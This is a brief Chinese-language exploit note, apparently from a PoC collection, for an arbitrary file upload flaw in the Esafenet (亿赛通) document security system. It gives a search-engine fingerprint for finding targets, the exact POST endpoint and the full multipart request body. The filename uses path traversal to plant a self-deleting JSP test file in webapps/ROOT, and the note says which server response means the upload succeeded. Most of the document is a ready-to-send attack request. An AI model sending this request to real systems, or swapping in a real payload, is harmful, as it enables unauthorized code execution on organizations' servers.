# 亿赛通电子文档安全管理系统syn_user_policy任意文件上传漏洞

- **系统**：亿赛通电子文档安全管理系统syn_user_policy　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app.name="ESAFENET 亿赛通文档安全管理系统"`
- **请求**：`POST /CDGServer3/fileType/importFileType.do?flag=syn_user_policy HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Content-Length: 287`　`Content-Type: multipart/form-data; boundary=----WebKitFormBoundarysebeiskw`

**请求体 / payload**
```
------WebKitFormBoundarysebeiskw
Content-Disposition: form-data; name="fileshare"; filename="/..\\..\\..\\..\\webapps\\ROOT\\test.jsp"
<% out.println(1111);new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
------WebKitFormBoundarysebeiskw--

服务器回显{"result":"xmlFail","msg":"操作失败"}则上传成功\
上传文件位置
/test.jsp
```

**其他**
- 亿赛通电子文档安全管理系统syn\_user\_policy任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 亿赛通电子文档安全管理系统